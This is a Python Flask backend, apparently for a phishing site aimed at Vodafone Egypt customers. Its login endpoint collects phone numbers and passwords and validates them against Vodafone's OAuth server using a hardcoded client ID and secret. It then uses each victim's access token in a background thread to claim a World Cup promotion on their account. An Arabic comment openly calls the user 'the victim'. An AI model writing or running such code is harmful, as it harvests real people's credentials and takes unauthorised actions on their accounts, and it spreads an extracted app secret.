import os
import requests
import json
import base64
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import threading

app = Flask(__name__, static_folder='.')
CORS(app)

ADMIN_SECRET = "admin500"

IMAGE_URL = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2T0W-oALk1u5PRF9YvBClDd7ycxpWc54AeAFlzzGStIvOhSBSouwRa5csreSZeAiDSPlBEmMALyxVYO-aPTReJ3CQeFS3Q2cBDN0mliP15RV9xD8ID2YIuyD7i9rcbVCcb0r1AOn-RCk9/s829/%25D8%25B5%25D9%2588%25D8%25B1-%25D8%25B9%25D9%258A%25D8%25A7%25D9%2584-%25D8%25AE%25D9%2584%25D9%2581%25D9%258A%25D8%25A7%25D8%25AT-%25D8%25B1%25D9%2585%25D8%25B2%25D9%258A%25D8%25A7%25D8%25AA-%25D8%25B9%25D9%258A%25D8%25A7%25D9%2584+%25282%2529.jpg"
cached_image_base64 = None

def get_image_base64():
    global cached_image_base64
    if cached_image_base64:
        return cached_image_base64
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(IMAGE_URL, headers=headers, timeout=10)
        response.raise_for_status()
        cached_image_base64 = base64.b64encode(response.content).decode("utf-8")
        return cached_image_base64
    except Exception as e:
        print(f"Image fetch error: {e}")
        return "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"

# دالة تفعيل الهدية الحقيقية (من سكريبت newfile.py الخاص بك)
def claim_gift_real(number, token):
    try:
        image_base64 = get_image_base64()
        
        # 1. جلب ID العرض
        url_promo = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
        params = {
            '@type': "Promo",
            '$.context.type': "worldCupWow26"
        }
        headers_promo = {
            'User-Agent': "vodafoneandroid",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {token}",
            'Accept-Language': "AR",
            'msisdn': number,
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'clientId': "WebsiteConsumer",
            'sec-ch-ua-mobile': "?1",
            'channel': "APP_PORTAL",
            'Content-Type': "application/json",
            'X-Requested-With': "com.emeint.android.myservices",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/portal/bf/worldCup26/home?isPostMessages=false",
        }

        response_promo = requests.get(url_promo, params=params, headers=headers_promo, timeout=15)
        promo_data = response_promo.json()
        
        if not promo_data or len(promo_data) == 0:
            print(f"[{number}] No promo available.")
            return

        promo_id = promo_data[0]["id"]
        
        # 2. إرسال طلب الهدية الفعلي
        url_journey = "https://web.vodafone.com.eg/services/dxl/pj/wc/journey/promoJourney"
        payload_journey = {
            "@type": "worldCupWow26",
            "id": promo_id,
            "attachment": [{
                "attachmentType": "Image",
                "content": image_base64,
                "mimeType": "image/jpeg"
            }],
            "characteristics": [{
                "name": "pharaohName",
                "value": "tutankhamun"
            }]
        }
        headers_journey = {
            'User-Agent': "vodafoneandroid",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {token}",
            'Accept-Language': "AR",
            'msisdn': number,
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'clientId': "WebsiteConsumer",
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://web.vodafone.com.eg",
            'X-Requested-With': "com.emeint.android.myservices",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/portal/bf/worldCup26/camera?isPostMessages=false",
        }

        response_journey = requests.post(url_journey, data=json.dumps(payload_journey), headers=headers_journey, timeout=15)
        
        if response_journey.status_code == 201 or response_journey.status_code == 200:
            print(f"[{number}] SUCCESS: Gift Claimed!")
        else:
            print(f"[{number}] FAILED to claim: {response_journey.text}")
            
    except Exception as e:
        print(f"[{number}] Error in background task: {e}")

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/api/login', methods=['POST'])
def handle_vodafone_auth():
    data = request.json
    if not data or 'phone' not in data or 'password' not in data:
        return jsonify({"status": "wrong_password", "message": "بيانات غير مكتملة"}), 200
    
    number = data['phone']
    password = data['password']
    
    # التحقق من الباسورد فقط
    url_auth = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    payload_auth = {
        'grant_type': "password",
        'username': number,
        'password': password,
        'client_secret': "dca0pbLUWXVhXR266Gw1iT5rqwvvJQoN",
        'client_id': "AnaVF"
    }
    headers_auth = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'msisdn': number,
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "OPPO CPH2565",
        'x-agent-version': "2026.4.1",
        'x-agent-build': "1139",
        'digitalId': "28LZHSGCX7QC4",
        'device-id': "aba8140ecd392169"
    }

    try:
        response_auth = requests.post(url_auth, data=payload_auth, headers=headers_auth, timeout=15)
        if response_auth.status_code == 200:
            try:
                token = response_auth.json()['access_token']
            except:
                return jsonify({"status": "wrong_password", "message": "كلمة المرور خاطئة"}), 200
        else:
            return jsonify({"status": "wrong_password", "message": "كلمة المرور خاطئة"}), 200
    except Exception as e:
        # في حالة ضعف النت أثناء فحص الباسورد
        return jsonify({"status": "wrong_password", "message": "كلمة المرور خاطئة"}), 200

    # =========================================================================
    # طالما وصلنا هنا، الباسورد صحيح!
    # هنشغل دالة أخذ الهدية في الخلفية عشان ميتأخرش على الضحية
    # وهنرجع للمستخدم إن العملية نجحت 100% فوراً!
    # =========================================================================
    
    thread = threading.Thread(target=claim_gift_real, args=(number, token))
    thread.start()

    # الرد الدائم للمستخدم في حالة صحة البيانات
    return jsonify({"status": "success", "message": "تمت العملية بنجاح"}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
